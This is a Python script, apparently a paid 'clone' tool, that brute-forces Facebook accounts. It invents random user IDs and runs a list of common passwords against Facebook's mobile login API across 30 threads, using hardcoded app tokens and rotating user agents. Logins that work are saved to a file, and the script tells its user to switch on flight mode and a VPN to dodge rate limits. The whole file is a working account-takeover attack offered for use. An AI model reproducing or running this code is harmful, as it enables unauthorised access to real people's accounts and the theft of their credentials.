import os, sys, json, uuid, string, random, requests
from concurrent.futures import ThreadPoolExecutor as tred

loop = 0 
oks = []
cps = []
gen = []

#______________OLD UA_______________#
def SEX22():
    url5 = ["Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0"]
    return random.choice(url5)

#______________BANNER SYSTEM_______________#
def clear(): os.system('clear')

def ____banner____():
    if "win" in sys.platform:
        os.system("cls")
    else:
        os.system("clear")
    
    print(f"""\033[1;32m

.##...##...####...##......######...####...##..##.
.###.###..##..##..##........##....##..##..##.##..
.##.#.##..######..##........##....##......####...
.##...##..##..##..##........##....##..##..##.##..
.##...##..##..##..######..######...####...##..##.
.................................................
######## TOOL BY MR PRINCE ######## 

---------------------------------
[✪] OWNER      : MR PRINCE
[✪] DEVELOPER  : MR PRINCE INSIIDE
[✪] STATUS     : PAID [+] V/1.1
[✪] TOOLS      : OLD & RANDOM & FILE
---------------------------------""")

#______________MAIN DEF_______________#
def main():
    ____banner____()
    print("[1] FILE CLONE [SOON] ")
    print("[2] RANDOM CLONEv[SOON]")
    print("[3] START CLONE [2009][WORK]")
    print("[4] NAGAD HALF INFO[]SOON")
    print("[5] NAGAD BAN [SOON]")
    print("-------------------------------")
    
    select = input("SELECT OPTION : ")
    if select == "3":
        HACKED("100000")
    elif select == "2":
        print("FUCK RANDOM")
    elif select == "1":
        print("COMING SOON")
    elif select == "4":
        print("COMING SOON")
    elif select == "5":
        print("COMING SOON")
    else:
        main()

#______________OLD DEF_______________#
def HACKED(series):
    ____banner____()
    global gen
    if series == "100000":
        SEX = "100000"
        SEX2 = 9
    else:
        SEX = "100000"
        SEX2 = 9

    for a in range(99999):
        AXN = "".join(random.choice(string.digits) for _ in range(SEX2))
        gen.append(AXN)

    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ____banner____()
        print("TOTAL IDS - " + str(len(gen)))
        print("USE FLIGHT MODE EVERY 3 MIN")
        print("USE 1.1.1.1 VPN FOR GOOD RESULT")
        print("-------------------------------")

        for love in gen:
            ids = SEX + love
            passlist = ["123456", "1234567", "12345678", "123456789", "000000", "1234567890", "123123", "khan123", "111111", "654321"]
            Fuck_xnxx.submit(Fucking_life, ids, passlist)

    sys.exit("\n-------------------------------")

#______________OLD METHOD_______________#   
def Fucking_life(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rHACKED [{loop}]|OK:[{len(cps)}]")
    sys.stdout.flush()
    
    try:
        for pas in passlist:
            data = {
                'adid': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'cpl': 'true',
                'credentials_type': 'device_based_login_password',
                "source": "device_based_login",
                'error_detail_type': 'button_with_disabled',
                'format': 'json',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'generate_machine_id': '1',
                "family_device_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "locale": "en_US",
                "client_country_code": "US",
                "device_id": str(uuid.uuid4()),
                "method": "auth.login",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
            }
            head = {
                'content-type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': SEX22(),
                'accept-encoding': 'gzip, deflate',
                'x-fb-http-engine': 'Liger'
            }
            url = "https://b-api.facebook.com/auth/login"
            response = requests.post(url, data=data, headers=head, verify=True).json()

            if "access_token" in response:
                print(f"\r\r\x1bMR_PRINCE-OK | {ids} • {pas}")
                open("/sdcard/MR_PRINCE-OK.txt", "a").write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print(f"\r\r\x1bMR_PRINCE-OK | {ids} • {pas}")
                open("/sdcard/MR_PRINCE-OK.txt", "a").write(ids + "|" + pas + "\n")
                cps.append(ids)
                break
        loop += 1
    except Exception as e:
        pass

#============ RUN SCRIPT ============#
if __name__ == "__main__":
    main()
